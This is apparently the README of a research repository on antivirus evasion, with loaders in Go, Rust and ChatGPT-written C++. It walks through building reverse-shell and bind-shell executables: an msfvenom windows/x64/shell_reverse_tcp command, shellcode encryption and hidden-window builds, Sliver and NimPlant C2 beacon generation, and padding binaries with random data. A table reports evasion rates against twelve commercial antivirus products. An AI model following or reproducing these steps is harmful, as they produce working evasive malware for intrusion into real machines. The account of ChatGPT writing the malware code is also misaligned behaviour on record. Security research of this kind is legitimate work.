<!-- ABOUT THE PROJECT -->
## About The Project

This project was created to share our code that is mentioned in the following paper. In this repository, we included only the relevant Go, Rust, and C++ code that was created by ChatGPT.


### Built With

This section lists all major frameworks/libraries used to create this project. 
1. Go 1.19.5
2. Rust (nightly-x86_64-pc-windows-msvc toolchain)
3. Python 3.10
4. pycryptodomex


<!-- GETTING STARTED -->
## Getting Started




### Requirements
1. Install Go 1.19.5
2. Install Rust (nightly-x86_64-pc-windows-msvc toolchain)
3. Install Visual Studio 2022 (Rust + C++)
4. Install C++ dependencies from Visual Studio 2022
5. Install Visual Studio Code (Go)
6. Install Python 3.10
7. Install pycryptodomex



<!-- USAGE EXAMPLES -->
## Usage
### For Go
1. msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f go 
2. Remove "0x" and new line values
3. Place the shellcode in the encryptGo.go file
4. Execute the code
5. Take the encrypted shellcode and place it in the decryptGo.go file
6. Compile the Go file to retrieve the .exe with the following command
```
go build -ldflags -H=windowsgui decryptGo.go
```

### For Rust
1. Place the shellcode.bin file to the same directory as with the encryptPython.py
2. Execute 
```
python encryptPython.py
```
to generate necessary files
3. Compile the code to retrieve the exe file
```
cargo build --release
```
Note: If you want to use Rust with two loaders, after encrypting the first binary file, edit the encryptPython.py file, to change the output name of the second binary file, as explained in the relevant Python comments. If you want to use only one loader, simply comment out the irrelevant code lines, as these have been noted in different comments in the Rust code.

### For C++ (ChatGPT)
1. Create a WindowsApplication dummy project in Visual Studio 2022
2. Change debug to release
3. Choose the proper port.
4. Compile the code to generate the exe file
5. Connect from a Linux host with the following command
```
nc IP PORT
```
If everything is working correctly, you should receive a "Connection Established!" message and be able to execute cmd commands to receive their response. If this message was not received, check if this port is open for inbound traffic in the Windows Firewall settings. If not, simply add a firewall rule to allow this traffic.

Note: If you want to use random generated files, execute the following command
```
head -c 90M </dev/urandom > file-2
```
With "file-2" the name of the output file, and "90M" is the file size. You can generate and include as many files as you like.


## Receiving connections
To be able to capture the response of these executables, I used two C2 servers, namely Sliver, and Nimplant. Along with Metasploit, which was used for. Also, Rust code requests a binary file to load into the process, while Go code loads a simple shellcode. So, to export such a file from Nimplant, execute:
```
python NimPlant.py compile
```
While, to generate such a file from Sliver, execute:
```
generate beacon --mtls IP --os windows --disable-sgn -f shellcode --skip-symbols --timeout 10
```
And start the "mtls" listener, by executing:
```
mtls
```

## AV Evasion
The following table refers to the executables with the best evasion rate from the study. This means that all these three executables had included randomly generated files, use the provided code, and for the Rust code, implemented both loaders.

|  AV | Go | Rust | C++ |
|---|---|---|---|
|Avast|✗|  ✓ |  ✗ |
|AVG |  ✗ |  ✓ |  ✗ |
|  Avira|  ✓ | ✓  |  ✓ |
|  MS Defender |  ✓ | ✓  | ✓  |
|  Webroot | ✓  |  ✓ | ✓ |
|  Eset |  ✗ |  ✓ |  ✓ |
|  BitDefender |  ✗ | ✓  | ✓ |
| Kaspersky |  ✓ |✓   |✗ |
| Sophos |  ✓ |  ✓ | ✓ |
| MalwareBytes |  ✓ |  ✓ | ✓ | 
| McAfee |  ✓ | ✓  | ✓  |
| Norton |  ✓ | ✓  |  ✓ |
| Results| 8/12| 12/12| 9/12|

<!-- CONTRIBUTING -->
## Contributing

Contributions are what make the open source community such an amazing place to learn, inspire, and create. If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag "enhancement".


<!-- LICENSE -->
## License

Distributed under the MIT License. See `LICENSE` for more information. The relevant code is provided only for educational purposes and authorized audits. Use it at your own risk.



<!-- CONTACT -->
## Contact

Efstratios Chatzoglou -  efchatzoglou@gmail.com 


<!-- ACKNOWLEDGMENTS -->
## Acknowledgments
I would like to thank the users that created the following three repositories, which they assisted into creating this one. The Go code is forked from https://github.com/sezzle/simpleGoAES, and https://github.com/Ne0nd0g/go-shellcode/tree/master/cmd/CreateProcess and the Rust code from https://github.com/cr7pt0pl4gu3/Pestilence.

